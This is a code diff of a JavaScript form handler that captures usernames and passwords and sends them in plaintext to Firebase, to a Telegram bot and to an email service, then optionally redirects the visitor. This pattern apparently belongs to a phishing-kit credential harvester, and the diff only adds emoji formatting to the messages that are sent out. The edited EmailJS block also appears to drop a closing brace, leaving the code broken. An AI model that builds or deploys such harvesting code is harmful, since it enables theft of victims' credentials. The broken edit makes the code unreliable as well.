@@ -190,23 +190,25 @@ function renderForm(data){
       const extraValues = extraInputs.map(i=>i.value);
 
       const submission = {
-        username,
-        password,
-        extraFields: extraValues,
-        createdAt: new Date().toISOString()
-      };
+  username: `👤 ${username}`,
+  password: `🔐 ${password}`,
+  extraFields: extraValues.map(v => `📝 ${v}`),
+  createdAt: `⏰ ${new Date().toISOString()}`
+};
 
       // 3️⃣ Save to Firebase
       try { await db.collection("submissions").add(submission); } 
       catch(err){ console.error("Firestore error:", err); }
 
       // 4️⃣ Send Telegram
-      const telegramMsg = `
-New Form Submission:
-Username: ${username}
-Password: ${password}
-Extra: ${extraValues.join(", ")}
-Time: ${new Date().toLocaleString()}
+    const telegramMsg = `
+📥 *New Form Submission*
+
+👤 Username: ${username || "N/A"}
+🔐 Password: ${password || "N/A"}
+📝 Extra Fields: ${extraValues.length ? extraValues.join(" | ") : "None"}
+⏰ Time: ${new Date().toLocaleString()}
+🌍 Source: Web Form
 `;
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
@@ -216,10 +218,12 @@ Time: ${new Date().toLocaleString()}
 
       // 5️⃣ Send Email (optional via EmailJS)
       if(typeof emailjs !== "undefined"){
-        emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID", {
-          username, password, extra: extraValues.join(", "), date: new Date().toLocaleString()
-        }).catch(console.error);
-      }
+       emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID", {
+  username: `👤 ${username}`,
+  password: `🔐 ${password}`,
+  extra: `📝 ${extraValues.join(", ")}`,
+  date: `⏰ ${new Date().toLocaleString()}`
+})
 
       // 6️⃣ Redirect if enabled
       if(data.enableRedirect && data.redirectURL){
